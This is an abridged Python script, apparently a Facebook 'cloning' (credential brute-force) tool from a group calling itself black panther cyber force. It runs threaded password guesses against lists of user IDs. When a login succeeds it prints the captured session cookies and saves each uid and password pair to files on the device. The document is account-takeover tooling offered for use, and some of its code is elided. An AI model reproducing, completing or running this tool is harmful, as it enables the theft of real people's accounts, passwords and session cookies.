# NAME : ESHAN AHAMED EVU 
# GITHUB : https://github.com/nobita808
# FB GROUP : black panther cyber force
# FB ID : ESHAN AHAMED EVU 
...
def Main():
        ...
        if Alhaj in ["1","01"]:
            sexy()
        if Alhaj in ["2","02"]:
        	os.system('xdg-open https://wa.me/+01320938366')
        if Alhaj in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        tl = str(len(user))
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print('\033[1;33m[+\033[1;33m] \033[1;37mYOUR TOTAL IDS : \033[1;35m'+tl)
        print("\033[1;33m[+\033[1;33m] \033[1;38mYOUR SIM CODE :\033[1;36m "+code)
        print('\033[1;33m[+\033[1;33m]\033[1;39m PLEASE WAIT CLONING START')
        print('\033[1;33m[+\033[1;33m] \033[1;36mUSE FLIGHT MODE ON/OF FOR SPEED UP')
        print('\033[1;33m[+\033[1;33m] \033[1;34mSUPER FAST SPEED CLONING')
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK BPCF-OK.txt')
    print(' [😁] CP BPCF-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alhaj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[BPCF]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;37m[\033[1;39mBPCF-hello-OK 😝\033[1;33m]\033[1;98m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;93m[😜] COOKIE :\033[1;97m {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mBPCF-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/BPCF-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
